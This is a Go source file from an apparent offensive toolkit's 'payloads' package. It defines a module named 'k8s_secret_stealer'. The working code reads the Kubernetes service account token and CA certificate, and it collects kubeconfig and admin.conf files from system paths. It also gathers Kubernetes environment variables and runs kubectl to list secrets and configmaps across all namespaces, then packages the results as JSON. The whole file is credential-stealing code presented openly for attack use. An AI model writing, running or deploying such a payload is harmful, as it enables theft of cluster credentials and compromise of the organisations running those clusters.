package payloads

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

func init() {
	Register(&K8sSecretStealer{})
}

type K8sSecretStealer struct{}

func (k *K8sSecretStealer) Name() string     { return "k8s_secret_stealer" }
func (k *K8sSecretStealer) Category() string { return "credential" }
func (k *K8sSecretStealer) Description() string {
	return "Extract K8s secrets, config files, and service account tokens"
}

func (k *K8sSecretStealer) Execute(args map[string]string) ([]byte, error) {
	result := k.extract()
	return MarshalJSON(result)
}

type k8sResult struct {
	Timestamp   string            `json:"timestamp"`
	IsK8s       bool              `json:"is_kubernetes"`
	Namespace   string            `json:"namespace"`
	SAToken     string            `json:"sa_token,omitempty"`
	SACert      string            `json:"sa_cert,omitempty"`
	KubeConfigs []configFile      `json:"kubeconfigs,omitempty"`
	Secrets     []string          `json:"secrets,omitempty"`
	ConfigMaps  []string          `json:"configmaps,omitempty"`
	EnvVars     map[string]string `json:"env_vars,omitempty"`
	Summary     map[string]int    `json:"summary"`
}

type configFile struct {
	Path    string `json:"path"`
	Content string `json:"content,omitempty"`
}

func (k *K8sSecretStealer) extract() *k8sResult {
	r := &k8sResult{
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		EnvVars:   make(map[string]string),
		Summary:   make(map[string]int),
	}

	// Check if running in K8s
	saPath := "/var/run/secrets/kubernetes.io/serviceaccount"
	if fi, err := os.Stat(saPath); err == nil && fi.IsDir() {
		r.IsK8s = true

		// Namespace
		if ns, err := os.ReadFile(filepath.Join(saPath, "namespace")); err == nil {
			r.Namespace = strings.TrimSpace(string(ns))
		}

		// Token
		if token, err := os.ReadFile(filepath.Join(saPath, "token")); err == nil {
			r.SAToken = strings.TrimSpace(string(token))
		}

		// CA cert
		if ca, err := os.ReadFile(filepath.Join(saPath, "ca.crt")); err == nil {
			r.SACert = string(ca)
		}

		r.Summary["sa_token"] = 1
	}

	// Kubeconfigs
	r.KubeConfigs = findKubeConfigs()
	r.Summary["kubeconfigs"] = len(r.KubeConfigs)

	// K8s env vars
	k8sEnvVars := []string{
		"KUBERNETES_SERVICE_HOST", "KUBERNETES_SERVICE_PORT",
		"KUBERNETES_PORT", "KUBERNETES_SERVICE_PORT_HTTPS",
	}
	for _, v := range k8sEnvVars {
		if val := os.Getenv(v); val != "" {
			r.EnvVars[v] = val
		}
	}

	// Try kubectl for secret listing
	if kubectl, err := exec.LookPath("kubectl"); err == nil {
		out, err := exec.Command(kubectl, "get", "secrets",
			"--all-namespaces", "-o", "name").Output()
		if err == nil {
			secrets := strings.Fields(string(out))
			if len(secrets) > 10 {
				secrets = secrets[:10]
			}
			r.Secrets = secrets
			r.Summary["secrets"] = len(secrets)
		}

		// ConfigMaps
		cmOut, err := exec.Command(kubectl, "get", "configmaps",
			"--all-namespaces", "-o", "name").Output()
		if err == nil {
			cms := strings.Fields(string(cmOut))
			if len(cms) > 10 {
				cms = cms[:10]
			}
			r.ConfigMaps = cms
			r.Summary["configmaps"] = len(cms)
		}
	}

	return r
}

func findKubeConfigs() []configFile {
	var configs []configFile
	home, _ := os.UserHomeDir()

	paths := []string{
		filepath.Join(home, ".kube", "config"),
		"/root/.kube/config",
		"/etc/kubernetes/admin.conf",
		"/etc/kubernetes/kubelet.conf",
		"/etc/kubernetes/controller-manager.conf",
		"/etc/kubernetes/scheduler.conf",
		"/var/lib/kubelet/kubeconfig",
	}

	for _, path := range paths {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		content := string(data)
		if len(content) > 2000 {
			content = content[:2000] + "..."
		}
		configs = append(configs, configFile{
			Path:    path,
			Content: content,
		})
	}

	return configs
}

// Force fmt usage
var _ = fmt.Sprintf
